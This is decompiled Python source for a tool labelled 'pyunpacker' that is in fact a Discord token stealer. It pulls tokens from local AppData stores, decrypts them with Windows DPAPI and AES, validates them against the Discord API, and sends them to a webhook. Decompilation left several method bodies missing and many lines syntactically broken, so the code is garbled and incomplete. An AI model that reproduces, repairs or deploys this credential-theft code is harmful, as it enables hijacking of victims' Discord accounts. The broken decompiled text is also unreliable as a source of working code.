# pyunpacker v1.0 (by Vault) #

import base64
import json
import os
import re
import requests
from Crypto.Cipher import AES
from discord import Embed, SyncWebhook
from win32crypt import CryptUnprotectData

class DiscordToken:
    
    def __init__(self, webhook):
        upload_tokens(webhook).upload()



class extract_tokens:
    
    def __init__(self):
        setattr(self, 'base_url', 'https://discord.com/api/v9/users/@me')
        setattr(self, 'appdata', os.getenv('localappdata'))
        setattr(self, 'roaming', os.getenv('appdata'))
        setattr(self, 'regexp', '[w-]{24}.[w-]{6}.[w-]{25,110}')
        setattr(self, 'regexp_enc', 'dQw4w9WgXcQ:[^"]*')
        self.tokens = []
        self.uids = []
        self.extract()

    
    def extract(self):
        pass
    # WARNING: Decompyle incomplete

    
    def validate_token(self, token):
        r = requests.get(self.base_url, {
            'Authorization': token }, **('headers',))
    # WARNING: Decompyle incomplete

    
    def decrypt_val(self, buff, master_key):
        pass
    # WARNING: Decompyle incomplete

    
    def get_master_key(self, path):
        if not os.path.exists(path):
            return None
        if None('base64').b64decode(__import__('zlib').decompress(b'xxdaK2xf6Kx8b4xf62Mxf6x08xb4x05x00x17xacx03x8e')).decode() not in open(path, 'r', __import__('base64').b64decode(__import__('zlib').decompress(b'xxdaKx89x08xcaxf5tIxb7x05x00x0cxd4x02xc0')).decode(), **('encoding',)).read():
            return None
        with None(path, 'r', __import__('base64').b64decode(__import__('zlib').decompress(b'xxdaKx89x08xcaxf5tIxb7x05x00x0cxd4x02xc0')).decode(), **('encoding',)) as f:
            c = f.read()
            None(None, None, None)
    # WARNING: Decompyle incomplete



class upload_tokens:
    
    def __init__(self, webhook):
        setattr(self, 'tokens', extract_tokens().tokens)
        setattr(self, 'webhook', SyncWebhook.from_url(webhook))

    
    def calc_flags(self, flags):
        pass
    # WARNING: Decompyle incomplete

    
    def upload(self):
        if not self.tokens:
            return None
    # WARNING: Decompyle incomplete


